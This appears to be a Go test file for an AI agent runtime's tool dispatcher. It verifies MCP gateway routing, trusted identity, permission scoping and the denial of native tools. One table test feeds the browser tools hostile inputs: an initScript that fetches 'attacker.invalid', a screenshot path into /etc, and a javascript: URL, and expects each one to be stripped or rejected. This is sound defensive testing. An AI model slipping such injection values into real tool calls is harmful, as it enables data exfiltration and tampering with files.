package main

import (
	"context"
	"testing"

	agentcore "orrery_v2/internal/agent/core"
	runtimecore "orrery_v2/internal/agent/runtime/core"
	skillres "orrery_v2/internal/resource/skill"
	toolstd "orrery_v2/internal/resource/tool/std"
	mcptransport "orrery_v2/internal/transport/mcp"
)

func TestProductionRuntimeToolDispatcherRoutesEnterpriseGraphThroughMCPGateway(t *testing.T) {
	ctx := context.Background()
	gateway := &productionRuntimeTestMCPGateway{}
	dispatcher := productionRuntimeToolDispatcher{mcpGateway: gateway}

	result, err := dispatcher.CallRuntimeTool(ctx, runtimecore.RuntimeToolCallRequest{
		TenantID: "tenant-minvia", RunID: "run-ontology", Name: string(toolstd.EnterpriseGraphBuildContextBundle), AgentID: "marlon-brando",
		ExecutionPrincipal: agentcore.ExecutionPrincipal{
			Kind: agentcore.ExecutionPrincipalAgent, ID: "marlon-brando", TenantID: "tenant-minvia",
		},
		ResponsibilityContext: &agentcore.ResponsibilityContext{
			ContextID: "context-ontology", ResponsibilityID: "responsibility-ontology", ResponsibilityVersion: 2,
			PolicyID: "policy-ontology", PolicyVersion: 3, AgentProfileID: "marlon-brando",
		},
		Input: map[string]any{
			"tenant_id": "tenant-minvia",
			"objective": "build company context",
		},
		RequestMeta: map[string]any{"consumer": "agent_runtime"},
		ToolBindings: []agentcore.RuntimeToolBinding{{
			ToolID:             toolstd.EnterpriseGraphBuildContextBundle,
			Alias:              "Enterprise Graph",
			GrantedPermissions: []string{toolstd.PermissionEnterpriseGraphRead},
		}},
	})
	if err != nil {
		t.Fatalf("CallRuntimeTool(enterprise graph): %v", err)
	}
	if gateway.request.TenantID != "tenant-minvia" ||
		gateway.request.RunID != "run-ontology" ||
		gateway.request.ToolID != string(toolstd.EnterpriseGraphBuildContextBundle) ||
		gateway.request.PrincipalID != "marlon-brando" ||
		gateway.request.AgentID != "marlon-brando" ||
		gateway.request.Arguments["objective"] != "build company context" {
		t.Fatalf("enterprise graph gateway request = %+v", gateway.request)
	}
	if gateway.request.ResponsibilityContext == nil || gateway.request.ResponsibilityContext.ContextID != "context-ontology" || gateway.request.ResponsibilityContext.PolicyVersion != 3 {
		t.Fatalf("enterprise graph responsibility context = %+v", gateway.request.ResponsibilityContext)
	}
	if gateway.request.PermissionsAuthoritative || len(gateway.request.Permissions) != 1 || gateway.request.Permissions[0] != toolstd.PermissionEnterpriseGraphRead {
		t.Fatalf("enterprise graph permissions = %v authoritative=%v", gateway.request.Permissions, gateway.request.PermissionsAuthoritative)
	}
	if gateway.request.RequestMeta["consumer"] != "agent_runtime" {
		t.Fatalf("enterprise graph gateway request metadata = %+v", gateway.request.RequestMeta)
	}
	actor, ok := gateway.request.Arguments["actor_ref"].(map[string]any)
	if !ok || actor["kind"] != "agent" || actor["id"] != "marlon-brando" ||
		gateway.request.Arguments["consumer"] != "agent-runtime" || gateway.request.Arguments["purpose"] != "runtime-context" {
		t.Fatalf("enterprise graph trusted context = %+v", gateway.request.Arguments)
	}
	if result.Output["ok"] != true {
		t.Fatalf("result = %+v", result.Output)
	}
}

func TestProductionRuntimeToolDispatcherRoutesEnterpriseGraphSearchObjectsWithBoundPermissionAndTrustedIdentity(t *testing.T) {
	gateway := &productionRuntimeTestMCPGateway{}
	dispatcher := productionRuntimeToolDispatcher{mcpGateway: gateway}

	result, err := dispatcher.CallRuntimeTool(context.Background(), runtimecore.RuntimeToolCallRequest{
		TenantID: "minvia", RunID: "run-search", Name: string(toolstd.EnterpriseGraphSearchObjects), AgentID: "personal-assistant",
		ExecutionPrincipal: agentcore.ExecutionPrincipal{
			Kind: agentcore.ExecutionPrincipalUser, ID: "user-1", TenantID: "minvia",
			PermissionScope: []string{"discussion.read"},
		},
		Input: map[string]any{
			"tenant_id": "orrery-conversation-id",
			"actor_ref": map[string]any{"kind": "agent", "id": "untrusted-agent"},
			"query":     "smoke probe",
			"limit":     3,
		},
		ToolBindings: []agentcore.RuntimeToolBinding{{
			ToolID:             toolstd.EnterpriseGraphSearchObjects,
			GrantedPermissions: []string{toolstd.PermissionEnterpriseGraphRead},
		}},
	})
	if err != nil {
		t.Fatalf("CallRuntimeTool(enterprise graph search): %v", err)
	}
	if gateway.request.ToolID != string(toolstd.EnterpriseGraphSearchObjects) ||
		gateway.request.TenantID != "minvia" ||
		gateway.request.Arguments["tenant_id"] != "minvia" ||
		gateway.request.Arguments["query"] != "smoke probe" ||
		gateway.request.Arguments["limit"] != 3 {
		t.Fatalf("enterprise graph search gateway request = %+v", gateway.request)
	}
	actor, ok := gateway.request.Arguments["actor_ref"].(map[string]any)
	if !ok || actor["kind"] != "user" || actor["id"] != "user-1" {
		t.Fatalf("enterprise graph search actor = %+v", gateway.request.Arguments["actor_ref"])
	}
	if gateway.request.PrincipalKind != "user" {
		t.Fatalf("enterprise graph principal kind = %q", gateway.request.PrincipalKind)
	}
	if !gateway.request.PermissionsAuthoritative || len(gateway.request.Permissions) != 2 ||
		gateway.request.Permissions[0] != "discussion.read" || gateway.request.Permissions[1] != toolstd.PermissionEnterpriseGraphRead {
		t.Fatalf("enterprise graph search permissions = %v authoritative=%v", gateway.request.Permissions, gateway.request.PermissionsAuthoritative)
	}
	if result.Output["ok"] != true {
		t.Fatalf("result = %+v", result.Output)
	}
}

func TestProductionRuntimeToolDispatcherRoutesExternalMCPTools(t *testing.T) {
	ctx := context.Background()
	gateway := &productionRuntimeTestMCPGateway{}
	dispatcher := productionRuntimeToolDispatcher{mcpGateway: gateway}

	result, err := dispatcher.CallRuntimeTool(ctx, runtimecore.RuntimeToolCallRequest{
		TenantID: "tenant-yunji", RunID: "run-yunji", Name: "mcp_yunji_candidate_advance", AgentID: "agent-yunji",
		ExecutionPrincipal: agentcore.ExecutionPrincipal{
			Kind: agentcore.ExecutionPrincipalUser, ID: "user-yunji", Source: "system_assistant",
			PermissionScope: []string{"yunji.candidate.advance"},
		},
		ResponsibilityContext: &agentcore.ResponsibilityContext{
			ContextID: "context-yunji", ResponsibilityID: "responsibility-yunji", ResponsibilityVersion: 2,
			PolicyID: "policy-yunji", PolicyVersion: 4, AgentProfileID: "agent-yunji",
			RequireExplicitToolScopes: true, TaskPermissionScopes: []string{"yunji.candidate.advance"},
		},
		Input: map[string]any{
			"candidateId": "cand-1",
		},
		RequestMeta: map[string]any{"com.minvia/orrery-hil-receipt": map[string]any{"approval_id": "approval-1"}},
		ToolBindings: []agentcore.RuntimeToolBinding{{
			ToolID:             "mcp.yunji.candidate:advance",
			Alias:              "mcp_yunji_candidate_advance",
			Source:             "mcp_server",
			ServerToolID:       "mcp.yunji",
			DownstreamToolName: "candidate:advance",
			GrantedPermissions: []string{"technical.agent.grant"},
		}},
	})
	if err != nil {
		t.Fatalf("CallRuntimeTool(external mcp): %v", err)
	}
	if gateway.request.TenantID != "tenant-yunji" ||
		gateway.request.RunID != "run-yunji" ||
		gateway.request.ToolID != "mcp.yunji.candidate:advance" ||
		gateway.request.PrincipalID != "user-yunji" ||
		gateway.request.AgentID != "agent-yunji" ||
		gateway.request.Arguments["candidateId"] != "cand-1" {
		t.Fatalf("mcp gateway request = %+v", gateway.request)
	}
	if gateway.request.ResponsibilityContext == nil || gateway.request.ResponsibilityContext.ContextID != "context-yunji" || gateway.request.ResponsibilityContext.PolicyVersion != 4 {
		t.Fatalf("mcp responsibility context = %+v", gateway.request.ResponsibilityContext)
	}
	if !gateway.request.PermissionsAuthoritative || len(gateway.request.Permissions) != 2 ||
		gateway.request.Permissions[0] != "yunji.candidate.advance" || gateway.request.Permissions[1] != "technical.agent.grant" {
		t.Fatalf("mcp permissions = %v authoritative=%v", gateway.request.Permissions, gateway.request.PermissionsAuthoritative)
	}
	if gateway.request.RequestMeta["com.minvia/orrery-hil-receipt"].(map[string]any)["approval_id"] != "approval-1" {
		t.Fatalf("mcp gateway request metadata = %+v", gateway.request.RequestMeta)
	}
	if result.Output["ok"] != true {
		t.Fatalf("result = %+v", result.Output)
	}
}

func TestProductionRuntimeToolDispatcherLocksServerBrowserArguments(t *testing.T) {
	tests := []struct {
		name       string
		tool       string
		input      map[string]any
		want       map[string]any
		wantFailed bool
	}{
		{
			name: "navigation strips script injection",
			tool: defaultServerBrowserNavigateTool,
			input: map[string]any{
				"url": "https://www.google.com/maps?q=Shanghai", "initScript": "fetch('https://attacker.invalid')", "type": "url",
			},
			want: map[string]any{"url": "https://www.google.com/maps?q=Shanghai"},
		},
		{
			name:  "screenshot strips file output",
			tool:  defaultServerBrowserScreenshotTool,
			input: map[string]any{"fullPage": true, "filePath": "/etc/orrery/orrery.yaml", "format": "png"},
			want:  map[string]any{"fullPage": true},
		},
		{
			name:       "navigation rejects javascript url",
			tool:       defaultServerBrowserNavigateTool,
			input:      map[string]any{"url": "javascript:alert(1)"},
			wantFailed: true,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			gateway := &productionRuntimeTestMCPGateway{}
			dispatcher := productionRuntimeToolDispatcher{mcpGateway: gateway}
			binding := agentcore.RuntimeToolBinding{
				ToolID:             agentcore.ToolID(string(defaultServerBrowserMCPServerToolID) + "." + test.tool),
				Alias:              "mcp_server_browser_" + test.tool,
				Source:             "mcp_server",
				ServerToolID:       string(defaultServerBrowserMCPServerToolID),
				DownstreamToolName: test.tool,
				GrantedPermissions: []string{defaultServerBrowserPermission},
			}
			result, err := dispatcher.CallRuntimeTool(context.Background(), runtimecore.RuntimeToolCallRequest{
				TenantID: "minvia", Name: binding.Alias, AgentID: "personal-assistant", Input: test.input, ToolBindings: []agentcore.RuntimeToolBinding{binding},
			})
			if err != nil {
				t.Fatalf("CallRuntimeTool: %v", err)
			}
			if test.wantFailed {
				if result.Output["status"] != "failed" || gateway.request.ToolID != "" {
					t.Fatalf("failure result=%+v gateway=%+v", result.Output, gateway.request)
				}
				return
			}
			if len(gateway.request.Arguments) != len(test.want) {
				t.Fatalf("browser arguments = %+v, want %+v", gateway.request.Arguments, test.want)
			}
			for key, want := range test.want {
				if gateway.request.Arguments[key] != want {
					t.Fatalf("browser argument %s = %#v, want %#v", key, gateway.request.Arguments[key], want)
				}
			}
		})
	}
}

func TestProductionRuntimeToolDispatcherRoutesWebToolsThroughMCPGateway(t *testing.T) {
	gateway := &productionRuntimeTestMCPGateway{}
	dispatcher := productionRuntimeToolDispatcher{mcpGateway: gateway}

	result, err := dispatcher.CallRuntimeTool(context.Background(), runtimecore.RuntimeToolCallRequest{
		TenantID: "tenant-minvia", RunID: "run-web", Name: string(toolstd.WebSearch), AgentID: "research-agent",
		ExecutionPrincipal: agentcore.ExecutionPrincipal{Kind: agentcore.ExecutionPrincipalUser, ID: "owner-minvia", TenantID: "tenant-minvia", PermissionScope: []string{"discussion.read"}},
		Input:              map[string]any{"query": "latest product release"},
		ToolBindings: []agentcore.RuntimeToolBinding{{
			ToolID: toolstd.WebSearch, Alias: "web_search", GrantedPermissions: []string{toolstd.PermissionWebRead},
		}},
	})
	if err != nil {
		t.Fatalf("CallRuntimeTool(web_search): %v", err)
	}
	if gateway.request.ToolID != string(toolstd.WebSearch) || gateway.request.PrincipalID != "owner-minvia" || gateway.request.Arguments["query"] != "latest product release" ||
		!gateway.request.PermissionsAuthoritative || len(gateway.request.Permissions) != 2 ||
		gateway.request.Permissions[0] != "discussion.read" || gateway.request.Permissions[1] != toolstd.PermissionWebRead || result.Output["ok"] != true {
		t.Fatalf("web gateway request = %+v result=%+v", gateway.request, result.Output)
	}
}

func TestProductionRuntimeToolDispatcherRejectsNativeToolsForExplicitScopeResponsibility(t *testing.T) {
	ctx := context.Background()
	shell := &productionRuntimeTestPersonalAssistantShellExecutor{}
	skills := &recordingRuntimeSkillExecutor{}
	dispatcher := productionRuntimeToolDispatcher{personalShell: shell, skills: skills}
	responsibility := &agentcore.ResponsibilityContext{
		ContextID: "context-autoplan", ResponsibilityID: "responsibility-autoplan", AgentProfileID: "agent-autoplan",
		RequireExplicitToolScopes: true, TaskPermissionScopes: []string{"repository.read"},
	}
	for _, call := range []runtimecore.RuntimeToolCallRequest{
		{Name: string(toolstd.SkillLoad), AgentID: "agent-autoplan", ResponsibilityContext: responsibility, Input: map[string]any{"skill_id": "skill.tdd"}},
		{Name: "run_terminal", AgentID: "agent-autoplan", ResponsibilityContext: responsibility, Input: map[string]any{"command": "pwd"}},
		{Name: "create_mission", AgentID: "agent-autoplan", ResponsibilityContext: responsibility, ProviderSpecific: map[string]string{"discussion_id": "discussion-autoplan"}},
	} {
		result, err := dispatcher.CallRuntimeTool(ctx, call)
		if err != nil {
			t.Fatalf("CallRuntimeTool(%s): %v", call.Name, err)
		}
		if result.Output["status"] != "failed" || result.Output["error"] != mcptransport.ErrPermissionDenied.Error() {
			t.Fatalf("native tool %s result = %+v", call.Name, result.Output)
		}
	}
	if skills.calls != 0 || shell.toolID != "" {
		t.Fatalf("explicit-scope task reached native executor: skill calls=%d shell=%q", skills.calls, shell.toolID)
	}
}

type recordingRuntimeSkillExecutor struct{ calls int }

func (e *recordingRuntimeSkillExecutor) ExecuteSkillTool(context.Context, string, skillres.RuntimeSkillRequest) (skillres.RuntimeToolResult, error) {
	e.calls++
	return skillres.RuntimeToolResult{Output: map[string]any{"ok": true}}, nil
}
